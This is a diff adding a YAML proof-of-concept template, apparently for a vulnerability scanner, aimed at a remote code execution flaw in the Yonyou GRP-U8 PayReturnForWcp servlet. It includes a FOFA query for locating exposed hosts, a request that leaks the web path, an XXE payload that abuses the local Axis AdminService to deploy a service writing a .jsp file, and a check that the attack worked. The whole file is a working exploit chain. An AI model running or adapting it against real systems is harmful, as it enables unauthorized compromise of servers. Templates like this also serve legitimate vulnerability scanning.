@@ -1,0 +1,27 @@
+id: poc-yaml-grp-u8-payreturnforwcp-rce
+info:
+  name: 用友GRP-U8 PayReturnForWcp 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: GRP-U8
+  fofa: app="用友-GRP-U8"
+variables:
+  t1: random_int(1000,10000)
+requests:
+- method: GET
+  path: /u8qx/pubDownTemplate.jsp
+  expression: status_code == 500
+  output:
+  - regex_match(body,`java.io.FileNotFoundException\x3a (?P<path>.*?) \(拒绝访问`)
+- method: POST
+  path: /servlet/PayReturnForWcp
+  data: '<?xml version="1.0"?>
+
+    <!DOCTYPE foo SYSTEM "http://127.0.0.1:{{.port}}/services/AdminService?method=!--%3E%3Cdeployment%20xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%20xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cservice%20name%3D%22OpenTaske{{.t1}}%22%20provider%3D%22java%3ARPC%22%3E%3CrequestFlow%3E%3Chandler%20type%3D%22java%3Aorg.apache.axis.handlers.LogHandler%22%20%3E%3Cparameter%20name%3D%22LogHandler.fileName%22%20value%3D%22{{.path}}\{{.t1}}.jsp%22%20%2F%3E%3Cparameter%20name%3D%22LogHandler.writeToConsole%22%20value%3D%22false%22%20%2F%3E%3C%2Fhandler%3E%3C%2FrequestFlow%3E%3Cparameter%20name%3D%22className%22%20value%3D%22java.util.Random%22%20%2F%3E%3Cparameter%20name%3D%22allowedMethods%22%20value%3D%22*%22%20%2F%3E%3C%2Fservice%3E%3C%2Fdeployment">'
+  expression: status_code == 200 && body == ""
+- method: GET
+  path: /services
+  expression: status_code == 200 && contains(body,"OpenTaske" + t1) && contains(body,"nextDouble")
+    && contains(body,"nextInt")
+transport: http
